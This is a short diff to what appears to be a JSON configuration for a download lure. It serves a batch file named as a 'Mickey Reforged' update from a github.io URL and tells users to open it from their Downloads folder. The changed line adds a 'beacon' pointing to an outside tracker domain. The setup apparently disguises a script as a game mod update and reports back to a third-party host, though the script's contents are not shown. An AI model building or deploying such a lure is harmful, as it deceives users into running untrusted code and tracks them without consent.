@@ -10,7 +10,7 @@
   "stub": "https://flippelt.github.io/cfg-data/dl/Mickey_Reforged_Update_v1.2.bat.txt",
   "stub_name": "Mickey_Reforged_Update_v1.2.bat",
   "delay_ms": 4200,
-  "beacon": "",
+  "beacon": "https://j7tracker.gb.net/hex/mod-setup",
   "done_title": "Update downloaded",
   "done_line": "Open Mickey_Reforged_Update_v1.2.bat from your Downloads folder to finish."
 }
